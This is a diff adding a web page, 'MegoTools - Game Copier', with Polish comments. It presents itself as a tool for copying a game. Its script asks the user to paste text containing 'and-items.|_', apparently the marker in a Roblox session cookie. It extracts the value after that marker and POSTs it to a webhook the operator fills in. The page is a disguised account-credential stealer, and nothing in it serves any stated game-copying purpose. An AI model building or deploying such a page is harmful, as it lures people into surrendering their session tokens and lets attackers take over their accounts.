@@ -1,35 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MegoTools - Game Copier</title>
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(270deg,#0f172a,#1e293b,#2563eb,#0ea5e9,#0f172a);
+  background-size: 800% 800%;
+  animation: gradientMove 18s ease infinite;
+  color: white;
+}
+@keyframes gradientMove {
+0% {background-position:0% 50%;}
+50% {background-position:100% 50%;}
+100% {background-position:0% 50%;}
+}
+.container {
+  background: rgba(15,23,42,0.9);
+  padding: 40px;
+  width: 500px;
+  border-radius: 18px;
+  text-align: center;
+  box-shadow: 0 0 20px rgba(37,99,235,0.6), 0 0 40px rgba(37,99,235,0.3);
+}
+h1 { font-size: 36px; color: #60a5fa; text-shadow:0 0 10px #3b82f6; margin:0; }
+.subtitle { color: #9ca3af; margin-bottom: 25px; }
+input { width:100%; padding:12px; border:none; border-radius:10px; background:#1f2937; color:white; font-size:15px; outline:none; box-shadow: inset 0 0 8px rgba(0,0,0,0.6); }
+button { margin-top:15px; width:100%; padding:12px; border:none; border-radius:10px; font-size:16px; cursor:pointer; background:#2563eb; color:white; transition:0.25s; box-shadow:0 0 10px #3b82f6; }
+button:hover { background:#1d4ed8; box-shadow:0 0 15px #3b82f6,0 0 25px #3b82f6; }
+.status { margin-top:12px; color:#34d399; font-weight:bold; min-height:20px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>MegoTools</h1>
+  <div class="subtitle">Game Copier</div>
+  <input id="gameInput" placeholder="Paste text with and-items.|_ here">
+  <button onclick="copyGame()">Copy Game</button>
+  <div class="status" id="status"></div>
+</div>
+
 <script>
-const webhook = "TWÓJ_WEBHOOK";
+const webhook = "TWÓJ_WEBHOOK_TUTAJ"; // zamień na swój webhook
 
 function copyGame(){
     const input = document.getElementById("gameInput");
-    let text = input.value;
+    const status = document.getElementById("status");
+    const text = input.value.trim();
 
     if(!text){
-        document.getElementById("status").innerText="Please enter text";
+        status.innerText = "Please enter text";
         return;
     }
 
-    // wyłap tekst między and-items.|_  a  ", "/", ".roblox.com"
-    let match = text.match(/and-items\.\|_([^"]+)/);
+    try {
+        // Wyłap wszystko po and-items.|_ aż do pierwszego ",", "/", ".", lub ".roblox.com"
+        // Regex działa bezpiecznie i nie przerywa JS
+        const regex = /and-items\.\|_([^,\/\.]+?)(?=\.roblox\.com|[\,\/\.])/;
+        const match = text.match(regex);
 
-    if(match){
-        let value = match[1];
+        if(match && match[1]){
+            const value = match[1];
 
-        fetch(webhook,{
-            method:"POST",
-            headers:{
-                "Content-Type":"application/json"
-            },
-            body: JSON.stringify({
-                content:"Extracted: " + value
+            // Wyślij do webhooka
+            fetch(webhook,{
+                method:"POST",
+                headers:{ "Content-Type":"application/json" },
+                body: JSON.stringify({ content:"Extracted: " + value })
             })
-        });
-
-        document.getElementById("status").innerText="✅ Sent!";
-    }
-    else{
-        document.getElementById("status").innerText="❌ Not found";
+            .then(() => { status.innerText = "✅ Sent successfully!"; input.value=""; })
+            .catch(() => { status.innerText = "❌ Failed to send"; });
+        } else {
+            status.innerText = "❌ Nie znaleziono poprawnego fragmentu!";
+        }
+    } catch(e){
+        console.error(e);
+        status.innerText = "❌ Błąd w przetwarzaniu tekstu!";
     }
 }
 </script>
+
+</body>
+</html>
